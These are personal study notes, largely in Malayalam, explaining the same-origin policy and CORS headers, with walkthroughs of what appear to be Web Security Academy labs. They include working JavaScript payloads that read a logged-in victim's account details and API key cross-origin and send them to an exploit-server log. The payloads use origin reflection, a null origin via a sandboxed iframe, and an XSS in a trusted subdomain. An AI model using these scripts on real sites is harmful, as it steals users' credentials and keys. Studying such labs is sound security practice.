## Cross-origin resource sharing:
### same origin policy:
     -> what is an ORIGIN?
      
--> `https://     websecurity-academy.com:      443/somepath` 
          scheme     +        domain                                  +   port         =same origin   (ORIGIN)

          some same-origin examples->
                    1) `https://websecurity-academy.com/somepath`
                    2) `https://websecurity-academy.com/anotherpath`
                    3) `https://websecurity-academy.com/againanotherpath`
-->when we have the same scheme,same origin and same port(ivide 443 kodukunil karanam https inte default port aan 443) regardless of the path(/somepath) ,it is considered to be the same origin

           some none-origin examples->
                    1) www.websecurity-academy.com/otherpath
                    2) websecurity-academy:7777   (diffrnt port)
                    3) ftp://websecurity-academy/somepath  (diffrnt scheme)
                    4) https://academy.websecurity-adacemy/somepath (ivide difrnt domain)
                    5) http://websecurity-academy.com:8080   (difrnt port)

-->different subdomain,port,sheme oke varumbol ath different origins aan
-->athayath ith browser implement chyuna oru technique aan.for example: oru shopping app um oru banking app namal browser il eduthu enn vecho.
-->ee shopping app malicious aanengil ith namude banking aap ilek banking info kitanayi oru request send chyum however when the browser seees that request,it will check the origin of the request and it will check where the request originated from.ivide ath shoppingapp.com enna domain il ninaan request banking appilek varunath and that domain is different from the domain of the banking app.so the browser rejects the request

### CORS:
-->moderm webapplications in avarude sumbomains umayi interact chyendi varum apol ee same origin policy undayal ath nadakil karanam browser reject chyum.so athin oru pariharaman namude CORS.
-->CORS is a browser mechanism which enables controlled access to resources located outside of a given domain.in simple, jwhere do you allow requests to come from
-->==CORS is a mechanism that uses http headers to define origins that the browser permit loading resources==
-->CORS make use of 2 http headers:
      1) Access-Control-Allow-Origin
      2) Access-Control-Allow-Credentials

-->ee Access-Control-Allow-Origin ennath namal chyuna requset in response aayi server tharuna oru header aan.rand domain thamil origin share chyan permission undengil server ath ee header response aayi namuk tharum
-->The Access-Control-Allow-Origin response header indicates whether the response can be shared with requesting code from the given origin
-->http header il namal kanuna `host: header` ennal namuk eth site il ninan data edukendath (if GET) allengil eth site ilek aan specific action nadathendath (if POST).athuple `origin: header` ennal ariyalo current url/site address
-->Access-Control-Allow-Origin il chyumbol.for example shopping site und athilek analytics subdomain ilninum data kitanam apol namal :
            `GET /data HTTP/1.1` 
            `Host: robust-website.com` 
            `Origin : https://shopping.com
-->ithinte response:
            `HTTP/1.1 200 OK`
            `Access-Control-Allow-Origin: https://analytics.shopping.com
-->ipol shopping.com il ninum products inte details anlytics.shopping.com il ninum kitum oru prashnavum ila
-->==Access-Control-Allow-Origin allows you to only access public pages in the application. inorder to access authenticated pages you need to use another header: Access-Control-Allow-Credentials header==
-->Access-Control-Allow-Credentials response header allows cookies (or other user credentials) to be included in cross-origin requests
-->athayath matooru domain il ninum namuk account details edukanam.ith ellavarkum edukan patila authorized aaya aalukalk mathrame access ulloo.so response il  Access-Control-Allow-Origin=domain, Access-Control-Allow-Credentials=true ennu kanan patum

==============================================================

         Lab-1(CORS vulnerability with basic origin reflection)
-->ivide namal lab open chyuka enit namal login chyuka.apol namude account open aakum.aa open aakuna requests elam note chyuka
-->ithil oru json /GET request kanam `/accountDetails` enna path ilek pokuna request
-->athile response il nokiyal kanam Access-Control-Allow-Credentials: true enn
-->athayath cors use chyunund athum important aayathan athukondan ee header response il varunath
-->athupole response il nokiyal kanam namude `details,api key` oke kidakunath
-->so ee request repeater il viduka enit oru puthiya header iduka ie, origin: hello.com enit send adichal kanam response il Access-Control-Allow-Origin: hello.com enn athayath eth domain il ninum request vanalum server accept chyum
-->ini namuk oru js malicious code undakanam adminte api key edukan
-->SCRIPT:
          <script> 
               var req = new XMLHttpRequest(); 
               req.onload = reqListener;
               req.open('get','$url/accountDetails',true); 
               req.withCredentials = true;                                   ----------1)
               req.send(); 
               
               function reqListener() { 
                        location='/log?key='+this.responseText; 
                }; 
            </script>

-->ivide `<html ,<body oke kodukanam keto` enale oru website il work aaku
-->ivide url il correct url kodukuka enit endpoint reeqeust il nokiyal kanam `/accountDetails` aa request il aanalo namal chyunath so aa path correct kodukuka.thuakam https:// idanam ok.
-->enit exploit server il poi deliver to victim adichit access log il poi nokiyal kanam adminte api key kidakunath so ath copy chyth submit chythal lab solve aayi
-->burp il request um response um nokuka.reqeust il nokiyal kanam athil session cookie und response il nokiyal kanam  Access-Control-Allow-Credentials: true enn so athinarthma ee session cookie aan ivide credential aayi use chyunath
--> ==Access-Control-Allow-Credentials allows credential to be passed in the request that could be cookies,authorization headers,certificates... but here the app makes use of a session cookie==
-->ivide 1) il namal credentals true kodukumbol aaru ee link ilek poiyalum avarude details,api key oke kitum
-->sradhikuka real life il namal thane namude server il ee script add chyanam.athayth namal control chyuna site il ee script add chyanam ennale work aaku.ivide admin ee page il varumbol adminte details namuk kitunu ok ath namal ormichirikanam
-->athayath josu.com/malicuous  enna pathil aan namal script chythirikunath ennal aa link victim in kodukanam apol avan click chyumbol ath work aayikolum
-->oru karyam koodi sredhikuka ivide namude respone il Access-Control-Allow-Credentials: true enna http header kanikunath kondan namuk ee task chyan patunath.ith ilengil namuk credentials kitila.athinte koode Access-Control-Allow-Origin enna response header namal origin: reqeust header vazhi test chythapol eth originum accept chyunathayi kandu athukondan work aakunath ilengil vere oru siteil ninum ee request borwser accept chyilla

==============================================================

          Lab-2(CORS vulnerability with trusted null origin)
-->ividem namal nerthe pole login chyuka.login chyumbol namuk load aayi varuna requests ellam nokuka athil oru json GET request und ath repeater il iduk
-->Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
-->nerthe pole aa request il origin: http://hello.com ennadichal response il Access-Control-Allow-Origin: hello.com enn kanikunila.ee header polum kanikunila
-->but namuk Access-Control-Allow-Credential: true enn kanikunund.so namuk publid and private resources edukan patum maryathak exploit chythal
-->so ivide origin: enth url koduthal Access-Control-Allow-Origin response header varathathkond origin: null enn koduth send adikumbol Access-Control-Allow-Origin response il kanikunund
-->so ini namuk script undakanam.ivide origin null ayathkond thane namude scritp oru sandbox origin inte ullil aaki idanam ennale work aaku
-->SCRIPT:
        <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
                var req = new XMLHttpRequest();
                req.onload = reqListener;
                req.open('get','https://0aff00f804a525b8c0e3306b0065006d.web-security-academy.net/accountDetails',true);
                req.withCredentials = true;
                req.send();
                function reqListener() {
                     location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
                };                                                                   ---1)
<               /script>">
        </iframe>
-->deliver chythit access log adichal apikey kitum ath submit chythal solve aayi
-->ivide 1) il nokiyal kanam athayath ee response eth pathilek varanam ennath aan kanikunath. athayath admin inte key ee parayuna pathil vannolum

==============================================================

            LaB-3(CORS vulnerability with trusted insecure protocols)
-->ividem namal login chythathin shesham GET /accountDetails enna json request eduth repeateril idunu.athinte response il Access-Control-Allow-Credentials: true enn und athupole api key yum und
-->so namal request il origin: https://something.com enn koduth send chyumbol Access-Control-Allow-Origin: enn header response il varunila.origin value null akumbozhum varunila
-->so namal host: header il ninum domain eduth https://doman.com enn koduth send chyumbol Access-Control-Allow-Origin:https://originaldomain.com enn reflect chyunund.so ini namuk ee domainte munnilayi oru fake subdoman koduth send chythal athum accept chyunundon nokanam
-->so origin: https://malicious.0a9e00400.....web-security-academy.net  enukodukumbol accept chyunund.so athinartham ee url umayi bandhapett eth subdomainum accept chyunund server
-->so ivide lab il stok.0a9e004......web-security-academy.net enna subdomain il site il ulla products inte stock chech chyuna oru request und so athil productid= enn parameter il <script>alert(3)</script> enn adich athinte response browseril nokumbol xss work aakunund.so namuk ee xss ee subdomainil cherth xss trigger chyipich admintem mattu usersintem apikey edukam
-->athayath alert alla oru script thane undaki athil mattullavarude apikey retrieve chyuna reethiyil ulla script undaki chyanam
-->SCRIPT:
          <script> document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>

-->ivide last exploitserver inte urrl kodukanam baki rand sthalathum namude site inte host name koduthal mathi
-->ini deliver to victim adich access log adichal adminte apikey kitum

==============================================================

        Lab-4(CORS vulnerability with internal network pivot attack)
-->ith expert lab aan 4 script undakanam javascript so difficult aan




==========================
